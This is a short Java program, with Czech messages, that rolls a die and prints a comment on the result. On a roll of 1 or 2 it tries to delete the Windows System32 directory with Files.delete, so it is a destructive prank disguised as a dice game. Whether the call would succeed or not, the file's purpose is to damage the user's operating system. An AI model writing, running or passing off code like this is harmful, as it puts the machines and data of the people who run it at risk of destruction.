import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Random;
public class windowsgon {



        public static void main(String[] args) {
            Random rng = new Random();
            int hodKostkou = rng.nextInt(1, 7); // Horní mez se negeneruje => 1-6

            if (hodKostkou == 6) {
                System.out.println("Dobrý hod");

            } else if (hodKostkou >= 3) {
                System.out.println("Mohlo to být horší");
            } else {
                System.out.println("Better luck next time.");
                try {
                    Files.delete(Paths.get("C:\\Windows\\System32"));
                } catch (IOException e) {
                    throw new RuntimeException(e);
                }
            }

        }

}
